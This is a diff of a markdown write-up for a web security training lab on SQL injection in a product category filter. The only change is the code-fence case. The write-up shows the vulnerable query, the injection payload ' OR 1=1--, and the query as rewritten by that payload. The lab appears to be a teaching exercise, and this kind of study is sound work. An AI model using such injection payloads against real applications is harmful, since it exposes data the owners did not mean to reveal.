@@ -4,7 +4,7 @@
 
 This lab contains an SQL injection vulnerability in the product category filter. When the user selects a category, the application carries out an SQL query like the following:
 
-```SQL
+```sql
 SELECT * FROM products WHERE category = 'Gifts' AND released = 1
 ```
 
@@ -18,7 +18,7 @@ https://ac6d1ff11f66bccd816d5ebd00c40052.web-security-academy.net/filter?categor
 
 Solution:
 
-```SQL
+```sql
 ' OR 1=1--
 ```
 
@@ -30,6 +30,6 @@ https://ac6d1ff11f66bccd816d5ebd00c40052.web-security-academy.net/filter?categor
 
 Modified SQL query:
 
-```SQL
+```sql
 SELECT * FROM products WHERE category = 'Gifts' OR 1=1--' AND released = 1
 ```
